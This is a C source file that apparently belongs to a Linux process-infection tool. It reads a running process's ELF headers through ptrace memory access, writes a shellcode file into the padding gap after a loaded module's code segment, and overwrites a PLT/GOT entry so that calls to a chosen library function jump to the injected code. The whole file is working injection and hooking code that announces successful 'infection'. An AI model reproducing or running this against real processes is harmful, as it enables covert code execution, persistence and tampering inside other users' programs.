#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <error.h>
#include <errno.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/fcntl.h>
#include <unistd.h>
#include <sys/ptrace.h>

#include <elf.h>

#include "memory_map_parser.h"
#include "parse_remote_elf.h"
#include "mem.h"

// TODO: Refactor this.
static const char *g_shellcode;
static size_t g_shellcodesize;

/*
static void *xrealloc(void *ptr, size_t size) {
	void *res = realloc(ptr, size);
	if(!res) error(-1, errno, "realloc()");
	return res;
}
*/

static int map_shellcode(const char *shellcode_path) {
	struct stat statbuf;
	
	int fd = open(shellcode_path, O_RDONLY);
	if(fd == -1) return 0;
	if(fstat(fd, &statbuf) == -1) {
		close(fd);
		return 0;
	}
	
	// st_size will be rounded up to page boundary by mmap, offset is 0.
	void *a = mmap(NULL, (size_t)statbuf.st_size, PROT_READ, MAP_PRIVATE, fd, 0);	
	if(a == MAP_FAILED)  { close(fd); return 0; }
	g_shellcode = (char*) a;
	g_shellcodesize = (size_t)statbuf.st_size;
	
	close(fd);
	return 1;
}

/* Given the base address of an object/module (ex. libc...), it injects 
 * the shellcode into an appropriate gap within target and returns the address of the shellcode.
 * If the object has already been infected the address of the already present shellcode is returned.
 * 
 * If the gap is not big enough for the shellcode this function fails, returning NULL.
 * 
 * */
static void *inject_shellcode(TARGET *target, void *base_address) {
	memory_region_t *regions = target->maps.regions;
	uint32_t num_regions = target->maps.num_regions;
	
	// Find the first region correspoding to base_address.
	// this first region is assumed to be the Read Execute mapping.
	// TODO Find it properly in case it's not. Most ELF's segment info is like that though.
	memory_region_t *region = NULL;
	for(size_t i = 0; i < num_regions; i++) {
		if(regions[i].start_address == base_address) region = &regions[i];
	}
	
	//if the region is already infected return already-existing shellcode address.
	if(region->shellcode_address) return region->shellcode_address;
	
	// Copy ELF and program header for this region and store it in the region object for caching.
	if(!region->pheader && !region->elfheader) {
		region->elfheader = xmalloc(sizeof(Elf64_Ehdr));
		int res = ReadProcessMemory(target->pid, base_address, region->elfheader, sizeof(Elf64_Ehdr));
		if(!res) {
			fprintf(stderr, "[DEBUG] Error reading elf header of an object.\n");
			free(region->elfheader);
			return NULL;
		}
		
		region->pheader = xmalloc(region->elfheader->e_phnum * sizeof(Elf64_Phdr));
		res = ReadProcessMemory(target->pid, (void*)((size_t)base_address + region->elfheader->e_phoff),
									region->pheader, region->elfheader->e_phnum*sizeof(Elf64_Ehdr));
		
		if(!res) {
			fprintf(stderr, "[DEBUG] Error reading program header of an object.\n");
			free(region->elfheader); free(region->pheader);
			return NULL;
		}
	}
	
	// Find the first loadable program segment of the region.
	Elf64_Phdr *firstload = NULL;
	for(int i=0; i<region->elfheader->e_phnum; i++) {
		Elf64_Phdr *ph = &region->pheader[i];
		if(ph->p_type == PT_LOAD || ph->p_type == PT_DYNAMIC) {
			firstload = ph;
			break;
		}
	}
	if(!firstload) {
		fprintf(stderr, "[DEBUG] Could not find program header on target region.\n");
		return NULL; 
	}
	
	// Find gap address and size
	// TODO: CHECK OFF BY ONE
	size_t regionsize = ((size_t)region->end_address - (size_t)region->start_address)+1;
	size_t gapsize = regionsize - firstload->p_memsz;
	if(gapsize < g_shellcodesize) return NULL; // shellcode does not fit
	void *gap_address = (void*)((size_t)region->start_address + firstload->p_memsz);
	
	// copy the shellcode into target
	fprintf(stderr, "[DEBUG] Injecting shellcode into gap %p (gapsize %lu bytes)\n", gap_address, gapsize);
	int res = WriteProcessMemory(target->pid, gap_address, g_shellcode, g_shellcodesize);
	if(!res){
		fprintf(stderr, "[DEBUG] Cannot inject shellcode into %p\n", base_address);
		return NULL;
	}
	
	region->shellcode_address = gap_address;
	return gap_address;
}

static int infect_entry(TARGET *target, size_t index) {
	
	pltgot_entry_t *entries = target->pltgot_entries;
	size_t numentries = (target->plt_gotsz/sizeof(Elf64_Addr))-3;
	if(index >= numentries) return 0; //...
	if(entries[index].is_infected) return 0;
	
	pltgot_entry_t *entry = &entries[index];
		
	void *shellcode_address = inject_shellcode(target, entry->module_base);
	if(!shellcode_address) return 0;
	
	// patch shellcode with return address.
	int res = WriteProcessMemory(target->pid, shellcode_address, &entry->jump_address, sizeof(entry->jump_address));
	if(!res) return 0;
	
	// overwrite pltgot entry with shellcode_address.
	void *addr = (void*) ((size_t)shellcode_address + 8); // skip return address.
	res = WriteProcessMemory(target->pid, entry->slot_address, &addr, sizeof(addr));
	
	return res;
}

// TODO: Make infect() return error code or something...
void infect(pid_t pid, int entry_num, char *shellcode_path) {
	TARGET target;
	
	if(!target_init(&target, pid))
		error(2, errno, "target_init");
		
	// map shellcode into memory.
	if(!map_shellcode(shellcode_path)) {
		fprintf(stderr, "[-] Cannot map shellcode into memory. Invalid path?\n");
		return;
	}
		
	if(!target_parse_remote_elf(&target))
		error(3, errno, "target_parse_remote_elf");
	
	if(!infect_entry(&target, entry_num)) {
		fprintf(stderr, "[-] Cannot infect #%d %s@%s\n", entry_num,
			target.pltgot_entries[entry_num].symname, target.pltgot_entries[entry_num].module);
	} else {
		fprintf(stderr, "[+] Infected #%d %s@%s\n", entry_num,
			target.pltgot_entries[entry_num].symname, target.pltgot_entries[entry_num].module);
	}
}
